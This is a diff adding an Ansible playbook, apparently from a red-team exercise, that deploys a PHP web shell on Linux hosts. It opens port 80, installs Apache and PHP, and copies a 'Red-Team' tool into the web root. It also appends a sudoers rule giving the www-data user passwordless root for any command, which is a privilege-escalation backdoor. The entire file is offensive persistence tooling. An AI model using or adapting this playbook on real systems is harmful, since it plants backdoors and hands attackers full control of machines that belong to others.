@@ -1,0 +1,37 @@
+---
+-   name: Deploy Apache Webshell
+    hosts: linux
+    gather_facts: false
+    become: true
+
+    tasks:
+      - name: Open port 80 in UFW
+        community.general.ufw:
+          rule: allow
+          port: '80'
+          proto: tcp
+        ignore_errors: yes
+
+      - name: Install apache if not installed
+        ansible.builtin.apt:
+          name: apache2
+          state: present
+          update_cache: true
+
+      - name: Install PHP
+        ansible.builtin.apt:
+          name: php
+          state: present
+     
+      - name: make target directory on linux host
+        ansible.builtin.file:
+          path: /var/www/html/Day2Inject
+          state: directory
+
+      - name: Move PHP tool into Apache Directory
+        ansible.builtin.copy:
+          src: /Red-Team/
+          dest: /var/www/html/Day2Inject/    
+
+      - name: Allow www-data user to run any commands as any user
+        ansible.builtin.command: echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
